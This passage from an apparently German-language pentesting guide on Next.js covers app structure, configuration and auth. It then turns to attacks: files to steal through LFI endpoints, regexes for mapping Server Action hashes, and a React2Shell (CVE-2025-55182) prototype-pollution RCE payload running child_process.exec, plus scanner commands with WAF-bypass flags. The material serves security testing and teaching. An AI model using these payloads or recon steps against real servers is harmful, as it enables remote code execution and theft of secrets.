- **Exposing Sensitive Paths:** Aliasing sensibler Verzeichnisse und das Ermöglichen von clientseitigem Zugriff kann vertrauliche Informationen leak.
- **Bundling Secrets:** Wenn sensible Dateien für den Client gebündelt werden, werden ihre Inhalte über source maps oder durch Inspektion des clientseitigen Codes zugänglich.

**How attackers abuse it:**

Angreifer können auf die Verzeichnisstruktur der Anwendung zugreifen oder sie rekonstruieren und dabei möglicherweise sensible Dateien oder Daten finden und ausnutzen.

</details>

### `pages/_app.js` und `pages/_document.js`

#### **`pages/_app.js`**

**Purpose:** Überschreibt die Standard-App-Komponente und ermöglicht globalen State, Styles und Layout-Komponenten.

**Use Cases:**

- Globales CSS einbinden.
- Hinzufügen von Layout-Wrappern.
- Integration von State-Management-Bibliotheken.

**Example:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Zweck:** Überschreibt das standardmäßige Document und ermöglicht die Anpassung der `<html>`- und `<body>`-Tags.

**Anwendungsfälle:**

- Ändern der `<html>`- oder `<body>`-Tags.
- Hinzufügen von Meta-Tags oder eigenen Skripten.
- Einbinden von Drittanbieter-Schriftarten.

**Beispiel:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Custom Server (Optional)

**Purpose:** Obwohl Next.js mit einem built-in server ausgeliefert wird, können Sie einen custom server für fortgeschrittene Anwendungsfälle wie custom routing oder die Integration in bestehende backend services erstellen.

**Hinweis:** Die Verwendung eines custom server kann die Deployment-Optionen einschränken, insbesondere auf Plattformen wie Vercel, die für Next.js's built-in server optimiert sind.

**Beispiel:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Zusätzliche Architektur- und Sicherheitsüberlegungen

### Umgebungsvariablen und Konfiguration

**Zweck:** Sensible Informationen und Konfigurationseinstellungen außerhalb der Codebasis verwalten.

**Bewährte Vorgehensweisen:**

- **Verwende `.env`-Dateien:** Speichere Variablen wie API-Schlüssel in `.env.local` (vom Versionskontrollsystem ausgeschlossen).
- **Greife sicher auf Variablen zu:** Verwende `process.env.VARIABLE_NAME`, um auf Umgebungsvariablen zuzugreifen.
- **Stelle Geheimnisse niemals auf dem Client offen:** Stelle sicher, dass sensible Variablen nur serverseitig verwendet werden.

**Beispiel:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Hinweis:** Um Variablen nur serverseitig zu halten, lassen Sie sie aus dem `env`-Objekt weg oder prefixen Sie sie mit `NEXT_PUBLIC_` für die Client-Exposition.

### Nützliche serverseitige Artefakte, die über LFI/download endpoints ins Visier genommen werden sollten

Wenn Sie in einer Next.js-App eine path traversal oder download API finden, konzentrieren Sie sich auf kompilierte Artefakte, die serverseitige Secrets und Auth-Logik leak:

- `.env` / `.env.local` für Session-Secrets und Provider-Credentials.
- `.next/routes-manifest.json` und `.next/build-manifest.json` für eine vollständige Routenliste.
- `.next/server/pages/api/auth/[...nextauth].js` um die kompilierte NextAuth-Konfiguration wiederherzustellen (enthält oft Fallback-Passwörter, wenn `process.env`-Werte nicht gesetzt sind).
- `next.config.js` / `next.config.mjs` um Rewrites, Redirects und Middleware-Routing zu prüfen.

### Authentifizierung und Autorisierung

**Vorgehensweise:**

- **Session-Based Authentication:** Verwenden Sie Cookies zur Verwaltung von Benutzersitzungen.
- **Token-Based Authentication:** JWTs für zustandslose Authentifizierung einsetzen.
- **Third-Party Providers:** Integrieren Sie OAuth-Provider (z. B. Google, GitHub) mit Bibliotheken wie `next-auth`.

**Sicherheitspraktiken:**

- **Secure Cookies:** Setzen Sie die Attribute `HttpOnly`, `Secure` und `SameSite`.
- **Password Hashing:** Passwörter immer hashen, bevor Sie sie speichern.
- **Input Validation:** Verhindern Sie Injection-Angriffe durch Validierung und Bereinigung von Eingaben.

**Beispiel:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Leistungsoptimierung

**Strategien:**

- **Bildoptimierung:** Verwende die `next/image`-Komponente von Next.js für automatische Bildoptimierung.
- **Code-Splitting:** Nutze dynamische Imports, um Code zu splitten und die anfänglichen Ladezeiten zu reduzieren.
- **Caching:** Implementiere Caching-Strategien für API-Antworten und statische Assets.
- **Lazy Loading:** Lade Komponenten oder Assets nur, wenn sie benötigt werden.

**Beispiel:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Modernes Next.js verwendet “Server Actions”, die auf dem Server ausgeführt werden, aber vom Client aufgerufen werden. In Produktion sind diese Aufrufe undurchsichtig: alle POSTs landen an einem gemeinsamen Endpoint und werden durch einen build-spezifischen Hash unterschieden, der im `Next-Action` Header gesendet wird. Beispiel:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wenn `productionBrowserSourceMaps` aktiviert ist, enthalten minifizierte JS-Chunks Aufrufe von `createServerReference(...)`, die genug Struktur leaken (plus zugehörige source maps), um eine Zuordnung zwischen dem action hash und dem ursprünglichen Funktionsnamen zu rekonstruieren. Dadurch lassen sich Hashes, die in `Next-Action` beobachtet werden, in konkrete Ziele wie `deleteUserAccount()` oder `exportFinancialData()` übersetzen.

### Extraktionsansatz (regex on minified JS + optional source maps)

Durchsuche heruntergeladene JS-Chunks nach `createServerReference` und extrahiere den Hash und das Funktions-/Source-Symbol. Zwei nützliche Muster:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Gruppe 1: server action hash (40+ hex-Zeichen)
- Gruppe 2: Symbol oder Pfad, der über die source map (falls vorhanden) auf den ursprünglichen Funktionsnamen aufgelöst werden kann

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Praktischer Workflow

- Passive Erkennung beim Browsen: Requests mit `Next-Action`-Headern und JS-Chunk-URLs erfassen.
- Die referenzierten JS-Bundles und die dazugehörigen `*.map`-Dateien (wenn vorhanden) herunterladen.
- Den obenstehenden Regex ausführen, um ein hash↔name Wörterbuch aufzubauen.
- Das Wörterbuch verwenden, um Tests gezielt anzusetzen:
  - Namensbasierte Triage (z. B. `transferFunds`, `exportFinancialData`).
  - Abdeckung über Builds hinweg nach Funktionsnamen verfolgen (Hashes rotieren zwischen Builds).

### Exercising hidden actions (template-based request)

Nimm einen gültigen POST, der im-Proxy beobachtet wurde, als Vorlage und tausche den `Next-Action`-Wert aus, um eine andere entdeckte action anzusprechen:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Im Repeater wiederholen und Autorisierung, Eingabevalidierung und Business-Logik von sonst unerreichbaren Aktionen testen.

### Burp-Automatisierung

- NextjsServerActionAnalyzer (Burp-Erweiterung) automatisiert das Obige in Burp:
- Durchsucht die Proxy-History nach JS-Chunks, extrahiert `createServerReference(...)`-Einträge und parst Source-Maps, wenn verfügbar.
- Pflegt ein durchsuchbares hash↔Funktionsnamen-Wörterbuch und entfernt Duplikate über Builds anhand des Funktionsnamens.
- Kann ein gültiges Template-POST finden und einen versandbereiten Repeater-Tab öffnen, in dem der Hash der Zielaktion eingesetzt ist.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Hinweise und Einschränkungen

- Erfordert `productionBrowserSourceMaps` in production aktiviert, um Namen aus Bundles/Source-Maps wiederherzustellen.
- Die Offenlegung von Funktionsnamen ist für sich genommen keine Schwachstelle; nutzen Sie sie zur Lenkung der Entdeckung und testen Sie die Autorisierung jeder Aktion.

### React Server Components Flight protocol Deserialisierungs-RCE (CVE-2025-55182)

Next.js App Router-Deployments, die Server Actions auf `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** exponieren, enthalten während der Deserialisierung von **Flight**-Chunks eine kritische serverseitige Prototype Pollution. Durch das Erstellen von `$`-Referenzen innerhalb einer Flight-Payload kann ein Angreifer von verschmutzten Prototypen zu beliebiger JavaScript-Ausführung und anschließend zu OS-Befehlsausführung im Node.js-Prozess pivotieren.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Angriffskette in Flight-Chunks

1. **Prototype pollution primitive:** Setze `"then": "$1:__proto__:then"`, sodass der Resolver eine `then`-Funktion auf `Object.prototype` schreibt. Jedes danach verarbeitete einfache Objekt wird so zu einem thenable, was dem Angreifer erlaubt, den asynchronen Kontrollfluss innerhalb der RSC-Interna zu beeinflussen.
2. **Rebinden an den globalen `Function`-Konstruktor:** Richte `_response._formData.get` auf `"$1:constructor:constructor"` aus. Während der Auflösung wird `object.constructor` → `Object`, und `Object.constructor` → `Function`, sodass zukünftige Aufrufe von `_formData.get()` tatsächlich `Function(...)` ausführen.
3. **Code-Ausführung via `_prefix`:** Platziere JavaScript-Quellcode in `_response._prefix`. Wenn das verschmutzte `_formData.get` aufgerufen wird, evaluiert das Framework `Function(_prefix)(...)`, sodass das injizierte JS `require('child_process').exec()` oder irgendeine andere Node-Primitive ausführen kann.

#### Payload-Skelett
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Kartierung der Offenlegung von React Server Functions

React Server Functions (RSF) sind alle Funktionen, die die 'use server'; Direktive enthalten. Jede form action, mutation oder fetch helper, die an eine dieser Funktionen gebunden ist, wird zu einem RSC Flight endpoint, das problemlos vom Angreifer bereitgestellte payloads deserialisieren kann. Nützliche Recon-Schritte, abgeleitet aus React2Shell-Assessments:

- **Statische Bestandsaufnahme:** Suche nach der Direktive, um zu verstehen, wie viele RSFs vom Framework automatisch offengelegt werden.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` aktiviert standardmäßig den App Router + das `app/`-Verzeichnis, womit stillschweigend jede Route zu einem RSC-fähigen Endpoint wird. App Router assets wie `/_next/static/chunks/app/` oder Antworten, die Flight-Chunks über `text/x-component` streamen, sind starke Internet-facing Fingerprints.
- **Implicitly vulnerable RSC deployments:** Die Advisory von React weist darauf hin, dass Apps, die die RSC-Runtime ausliefern, ausnutzbar sein können **selbst ohne explizite RSFs**, daher sollte jede Build mit `react-server-dom-*` 19.0.0–19.2.0 als verdächtig betrachtet werden.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. verwenden denselben Serializer und übernehmen dieselbe remote Angriffsfläche, bis sie gepatchte React-Builds einbetten.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **verwundbar** in 19.0.0, 19.1.0–19.1.1 und 19.2.0; **gepatched** in 19.0.1, 19.1.2 und 19.2.1 jeweils.
- **Next.js stable:** App Router Releases 15.0.0–16.0.6 enthalten den verwundbaren RSC-Stack. Patch-Trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 beinhalten gefixte deps, daher ist jede Build unter diesen Versionen ein lohnendes Ziel.
- **Next.js canary:** `14.3.0-canary.77+` liefert ebenfalls die fehlerhafte Runtime und hat derzeit keine gepatchten canary-Drops, wodurch diese Fingerprints starke Exploit-Kandidaten sind.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) sendet eine konstruierte multipart Flight-Anfrage an Kandidatenpfade und beobachtet das serverseitige Verhalten:

- **Default mode** führt eine deterministische RCE-Payload aus (Mathe-Operation, reflektiert über `X-Action-Redirect`) und beweist damit Codeausführung.
- **`--safe-check` mode** verfälscht absichtlich die Flight-Nachricht, sodass gepatchte Server `200/400` zurückgeben, während verwundbare Ziele `HTTP/500`-Antworten mit dem `E{"digest"` Teilstring im Body ausgeben. Dieses `(500 + digest)`-Paar ist derzeit das zuverlässigste remote Oracle, das von Verteidigern veröffentlicht wurde.
- Eingebaute `--waf-bypass`, `--vercel-waf-bypass` und `--windows` Switches passen das Payload-Layout an, fügen Junk voran oder tauschen OS-Kommandos aus, damit man reale Internet assets prüfen kann.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Referenzen

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
